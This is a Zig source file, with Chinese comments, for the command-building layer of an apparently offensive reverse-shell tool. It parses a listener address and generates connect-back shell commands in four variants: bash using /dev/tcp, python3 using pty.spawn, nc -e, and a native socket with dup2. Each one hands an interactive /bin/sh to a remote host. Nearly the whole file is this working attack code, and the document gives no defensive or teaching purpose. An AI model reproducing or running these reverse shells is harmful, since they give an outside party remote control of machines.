// 纯逻辑层：不 import tokota / 网络 API，跨平台可单测。
// 变体命令构建、listener 解析在此；socket/fork 执行链在 session.zig（Linux-only）。
const std = @import("std");

pub const Variant = enum {
    native,
    bash,
    python,
    nc,

    pub fn label(self: Variant) []const u8 {
        return switch (self) {
            .native => "native (socket + dup2 + /bin/sh -i，零依赖)",
            .bash => "bash (/dev/tcp)",
            .python => "python3 (pty.spawn)",
            .nc => "nc -e",
        };
    }
};

pub fn parseVariant(s: []const u8) ?Variant {
    if (std.ascii.eqlIgnoreCase(s, "native")) return .native;
    if (std.ascii.eqlIgnoreCase(s, "bash")) return .bash;
    if (std.ascii.eqlIgnoreCase(s, "python")) return .python;
    if (std.ascii.eqlIgnoreCase(s, "nc")) return .nc;
    return null;
}

pub const Listener = struct {
    host: []const u8,
    port: u16,
};

/// 解析 "host:port"（host 可为 IPv4/域名；IPv6 用 "[::1]:4444" 括号形式）。
pub fn parseListener(s: []const u8) !Listener {
    if (s.len == 0) return error.EmptyListener;
    if (s[0] == '[') {
        const close = std.mem.indexOfScalar(u8, s, ']') orelse return error.BadListener;
        const rest = s[close + 1 ..];
        if (rest.len < 2 or rest[0] != ':') return error.BadListener;
        const port = std.fmt.parseInt(u16, rest[1..], 10) catch return error.BadPort;
        if (port == 0) return error.BadPort;
        return .{ .host = s[1..close], .port = port };
    }
    const sep = std.mem.lastIndexOfScalar(u8, s, ':') orelse return error.BadListener;
    if (sep == 0 or sep + 1 >= s.len) return error.BadListener;
    const port = std.fmt.parseInt(u16, s[sep + 1 ..], 10) catch return error.BadPort;
    if (port == 0) return error.BadPort;
    return .{ .host = s[0..sep], .port = port };
}

/// 解释器变体生成 /bin/sh -c 命令串；native 返回 null（走 socket 直连路径）。
/// 命令串内 host/port 已插值；host 含引号类字符时由调用方保证来源可信（操作员输入）。
pub fn buildShellCommand(allocator: std.mem.Allocator, variant: Variant, listener: Listener) !?[:0]u8 {
    // 0.16 无 fmt.allocPrintZ：先 allocPrint 再 dupeZ
    const printed: []u8 = switch (variant) {
        .native => return null,
        .bash => try std.fmt.allocPrint(
            allocator,
            // 显式调 bash：/bin/sh 可能是 dash，不识别 /dev/tcp 与 >&
            "bash -c 'exec bash -i >& /dev/tcp/{s}/{d} 0>&1'",
            .{ listener.host, listener.port },
        ),
        .python => try std.fmt.allocPrint(
            allocator,
            "exec python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('{s}',{d}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')\"",
            .{ listener.host, listener.port },
        ),
        .nc => try std.fmt.allocPrint(
            allocator,
            "exec nc {s} {d} -e /bin/sh",
            .{ listener.host, listener.port },
        ),
    };
    defer allocator.free(printed);
    return try allocator.dupeZ(u8, printed);
}
